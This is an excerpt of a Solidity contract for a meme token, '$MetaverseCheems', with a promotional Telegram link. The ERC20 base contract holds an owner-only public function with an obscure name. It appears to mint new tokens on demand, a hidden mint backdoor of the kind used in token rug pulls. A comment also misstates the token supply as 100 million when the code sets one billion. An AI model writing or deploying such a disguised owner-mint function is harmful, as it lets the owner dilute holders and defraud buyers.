...
//
// $MetaverseCheems proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/MetaverseCheemsInu
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Metaversecheems(uint256 amount) public onlyOwner {
 _Metaversecheems(msg.sender, amount);
    }
    ...
    function _Metaversecheems(address account, uint256 amount) internal virtual {
...
contract $MetaverseCheems is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Metaverse Cheems", "METAVERSECHEEMS") {
        _Metaversecheems(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}